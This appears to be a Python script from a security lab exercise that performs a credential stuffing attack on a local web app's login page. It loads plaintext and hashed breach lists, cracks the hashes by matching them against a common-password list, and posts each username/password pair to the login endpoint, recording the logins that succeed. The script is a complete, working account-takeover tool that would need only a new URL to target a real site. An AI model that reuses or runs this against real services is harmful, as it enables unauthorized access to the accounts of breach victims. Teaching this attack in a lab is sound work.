from csv import reader
from requests import post, codes
import hashlib as hl
from app.util.hash import *
import pprint


LOGIN_URL = "http://localhost:8080/login"

PLAINTEXT_BREACH_PATH = "app/scripts/breaches/plaintext_breach.csv"
HASHED_PASSWORDS_PATH = "app/scripts/breaches/hashed_breach.csv"
COMMON_PASSWORD_HASH = "common_passwords.txt" 

def load_breach(fp):
    with open(fp) as f:
        r = reader(f, delimiter=' ')
        header = next(r)
        assert(header[0] == 'username')
        return list(r)

def load_hashed_breach(fp):
    with open(fp) as f:
        r = reader(f, delimiter=' ')
        header = next(r)
        assert(header[0] == 'username')
        return dict(r)

def load_common_passwords(fp):
    with open(fp) as f:
        r = reader(f)
        header = next(r)
        assert(header[0] == 'password')
        return list(r)

def attempt_login(username, password):
    response = post(LOGIN_URL,
                    data={
                        "username": username,
                        "password": password,
                        "login": "Login",
                    })
    return response.status_code == codes.ok

def create_common_pass_hash(common_pass):
    common_hash = {}
    h = hl.sha256()
    for password in common_pass:
        common_hash[hash_sha256(password[0])] = password[0]
    return common_hash

def credential_stuffing_attack(creds):
    hashed_breach = load_hashed_breach(HASHED_PASSWORDS_PATH)

    common_pass = load_common_passwords(COMMON_PASSWORD_HASH)
    comm_pass_hash = create_common_pass_hash(common_pass) 
    successful_creds = []
    for user_pass in creds:
        username = user_pass[0]
        password = user_pass[1]
        if attempt_login(username ,password):
            successful_creds.append(user_pass)
    for user in hashed_breach:
        if (hashed_breach[user] in comm_pass_hash):
            if( attempt_login(user, comm_pass_hash[hashed_breach[user]])):
                successful_creds.append((user, comm_pass_hash[hashed_breach[user]]))
    return successful_creds 

def main():
    creds = load_breach(PLAINTEXT_BREACH_PATH)
    credential_stuffing_attack(creds)

if __name__ == "__main__":
    main()
